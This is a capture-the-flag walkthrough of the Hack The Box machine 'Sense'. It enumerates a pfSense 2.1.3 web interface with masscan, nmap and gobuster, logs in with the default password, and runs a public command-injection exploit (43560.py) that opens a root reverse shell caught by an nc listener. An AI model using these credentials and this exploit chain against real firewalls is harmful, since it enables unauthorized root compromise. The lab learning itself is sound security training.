## Default Information
IP Address: 10.10.10.60\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.60    sense.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports. From the output, we realize that the ports belong to HTTP and HTTPs, which means that this machine only has web services.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.60 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-03 15:42:08 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 443/tcp on 10.10.10.60                                    
Discovered open port 80/tcp on 10.10.10.60   
```

### Nmap
Afterwards,we will use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | lighttpd 1.4.35 | Open |
| 443	| ssl/http syn-ack | lighttpd 1.4.35 | Open |

Next, we will use Nmap to scan for potential vulnerabilities in port 80 and 443. However, there didn't seem to have any vulnerability that we could use to exploit

```
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
443/tcp open  https   syn-ack ttl 63
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /javascript/sorttable.js: Secunia NSI
|   /changelog.txt: Interesting, a changelog.
|_  /tree/: Potentially interesting folder
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
|             Modulus Type: Non-safe prime
|             Modulus Source: RFC5114/1024-bit DSA group with 160-bit prime order subgroup
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.securityfocus.com/bid/70574
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown:
```
### Ssylze
Using sslyze did not turn up any potential vulnerabilities at all.

### Gobuster
Next, we will use Gobuster to find the endpoints that are accessible from http://10.10.10.60. However, they were unable to produce any useful outputs.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50 --timeout 20s --wildcard -z
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 20s
===============================================================
2021/10/03 12:13:22 Starting gobuster in directory enumeration mode
===============================================================
https://10.10.10.60/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
https://10.10.10.60/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]   
https://10.10.10.60/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
https://10.10.10.60/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
https://10.10.10.60/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]   
https://10.10.10.60/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]   
https://10.10.10.60/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]      
https://10.10.10.60/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/] 
https://10.10.10.60/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/] 
https://10.10.10.60/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/] 
https://10.10.10.60/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]      
https://10.10.10.60/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
```

We will also tried to find virtual hosts on http://sense.htb, but we were unable to find any vhosts.

Next, we will try to use Gobuster to do an enumeration for common files extensions such as .js,.txt,.php and .html. From the output, there is actually a lot directories and files that are irrelevent. However, there are 2 text files that catch our attention, namely ```changelog.txt``` and ```system-users.txt```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50 -x php,txt,html,js --wildcard -o gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,js
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/10/03 12:46:21 Starting gobuster in directory enumeration mode
===============================================================
https://10.10.10.60/help.php             (Status: 200) [Size: 6689]
https://10.10.10.60/index.php            (Status: 200) [Size: 6690]
https://10.10.10.60/index.html           (Status: 200) [Size: 329]
https://10.10.10.60/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
https://10.10.10.60/stats.php            (Status: 200) [Size: 6690]
https://10.10.10.60/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
https://10.10.10.60/edit.php             (Status: 200) [Size: 6689]
https://10.10.10.60/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
https://10.10.10.60/system.php           (Status: 200) [Size: 6691]
https://10.10.10.60/license.php          (Status: 200) [Size: 6692]
https://10.10.10.60/status.php           (Status: 200) [Size: 6691]
https://10.10.10.60/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
https://10.10.10.60/changelog.txt        (Status: 200) [Size: 271]
https://10.10.10.60/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
https://10.10.10.60/exec.php             (Status: 200) [Size: 6689]
https://10.10.10.60/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
https://10.10.10.60/graph.php            (Status: 200) [Size: 6690]
https://10.10.10.60/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]
https://10.10.10.60/wizard.php           (Status: 200) [Size: 6691]
https://10.10.10.60/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]
https://10.10.10.60/pkg.php              (Status: 200) [Size: 6688]
https://10.10.10.60/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]
https://10.10.10.60/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]
https://10.10.10.60/xmlrpc.php           (Status: 200) [Size: 384]
https://10.10.10.60/reboot.php           (Status: 200) [Size: 6691]
https://10.10.10.60/interfaces.php       (Status: 200) [Size: 6695]
https://10.10.10.60/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]
https://10.10.10.60/system-users.txt     (Status: 200) [Size: 106]
https://10.10.10.60/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
```

### Web Content Discovery

Visiting https://sense.htb/changelog.txt, we know that there is still an existing vulnerability that is not patched yet. Maybe, this could be CVE that we could look into when we try to exploit the site.

![changelog.txt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Sense/changelog.PNG)

Visiting https://sense.htb/system-users.txt, we are able to know that the username to login to the website is ```Rohit```, but we do not know the password. 

![syetsm-users.txt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Sense/system-users.PNG)

## Exploit
### Gaining access to pfsense
Previously, we were able to establish that the username for login to the website is ```rohit```, but we do not know the password. Researching on the default credentials for pfsense, we find that the default password used is ```pfsense```. Trying this combination of username and password, we were able to gain access to the website. 

Looking at the internal site, we realized that most of the features are not available and not fully configured.

However, from the index page we are able to establish that we are using ```pfsense 2.1.3-release```. 

![pfsense version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Sense/pfsense_version.PNG)

Using searchsploit, we are able to identify a possible vulnerbaility on the ```/status_rrd_graph_img.php``` endpoint. 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ searchsploit pfsense 2.1.3
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command  | php/webapps/43560.py
------------------------------------------------------ ---------------------------------
```

### Obtaining reverse shell
We will then save the python script and execute it to obtain a reverse shell.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.5 --lport 3001 --username rohit --password pfsense 
CSRF token obtained
Running exploit...
Exploit completed
```

We can also see that we are granted root access upon the exploit
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3001           
listening on [any] 3001 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.60] 29901
sh: can't access tty; job control turned off
# whoami
root
```

### Obtaining user flag

```
# cd /home/rohit
# cat user.txt
<Redacted root flag>
```
### Obtaining root flag

```
# cd /root
# cat root.txt
<Redacted root flag>
```
